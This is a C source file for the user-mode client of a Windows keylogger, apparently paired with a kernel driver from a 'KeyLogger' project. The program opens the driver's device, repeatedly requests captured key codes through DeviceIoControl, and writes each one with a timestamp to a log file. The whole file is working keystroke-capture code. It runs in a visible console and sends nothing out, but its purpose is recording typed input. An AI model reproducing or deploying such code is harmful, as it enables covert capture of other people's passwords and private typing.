#pragma warning(disable: 4668)
#include <Windows.h>
#pragma warning(default: 4668)
#include <Tchar.h>
#include <Signal.h>
#include <Time.h>

#pragma warning(disable: 4464)
#include "../KeyLogger/info.h"
#include "../KeyLogger/ioCtls.h"
#pragma warning(default: 4464)

#define DEVICE_PATH \
	_T("\\\\.\\") DEVICE_NAME

typedef struct _CONTEXT_DATA
{
	HANDLE hFile;
	HANDLE hDevice;

} CONTEXT_DATA, *PCONTEXT_DATA;

DWORD
LoggingFunc(
	PCONTEXT_DATA pContextData)
{
	time_t t;
	USHORT key;
	TCHAR buffer[32];

	while (TRUE)
	{
		DeviceIoControl(pContextData->hDevice, GET_KEY, NULL, 0, &key, sizeof(key), NULL, NULL);
		ZeroMemory(buffer, sizeof(buffer));
		t = time(NULL);
		_tctime_s(buffer, ARRAYSIZE(buffer), &t);
		_stprintf_s(buffer + lstrlen(buffer) - 1, ARRAYSIZE(buffer), _T(" - %hu\r\n"), key);
		WriteFile(pContextData->hFile, buffer, lstrlen(buffer) * sizeof(TCHAR), NULL, NULL);
	}
}

HANDLE hLogger;

#pragma warning(disable: 6258)

VOID
ExitRoutine(
	INT p)
{
	UNREFERENCED_PARAMETER(p);
	TerminateThread(hLogger, EXIT_SUCCESS);
	_tsystem(_T("pause"));
}

#pragma warning(default: 6258)

INT
_tmain(
	INT argc,
	PCTSTR argv[])
{
	if (argc > 2)
	{
		_putts(_T("Incorrect parameters"));
		_putts(_T("KeyLogger.exe <log file path [By default 'Log.log']>"));
		return EXIT_FAILURE;
	}

	if (signal(SIGINT, ExitRoutine) == SIG_ERR)
	{
		_putts(_T("Interrupt signal setting error"));
		return EXIT_FAILURE;
	}

	CONTEXT_DATA contextData;
	contextData.hFile = CreateFile(
		argc == 2 ? argv[1] : _T("Logs.log"),
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (contextData.hFile == INVALID_HANDLE_VALUE)
	{
		_putts(_T("Error creating log file"));
		return EXIT_FAILURE;
	}

	contextData.hDevice = CreateFile(
		DEVICE_PATH,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (contextData.hDevice == INVALID_HANDLE_VALUE)
	{
		_putts(_T("Error opening device"));
		CloseHandle(contextData.hFile);
		return EXIT_FAILURE;
	}

	hLogger = CreateThread(NULL, 0, LoggingFunc, &contextData, 0, NULL);
	if (!hLogger)
	{
		_putts(_T("Stream creation error"));
		CloseHandle(contextData.hDevice);
		CloseHandle(contextData.hFile);
		return EXIT_FAILURE;
	}

	_putts(_T("Ctrl+C to exit"));
	_putts(_T("Logging..."));

	WaitForSingleObject(hLogger, INFINITE);

	CloseHandle(hLogger);
	CloseHandle(contextData.hDevice);
	CloseHandle(contextData.hFile);
	return EXIT_SUCCESS;
}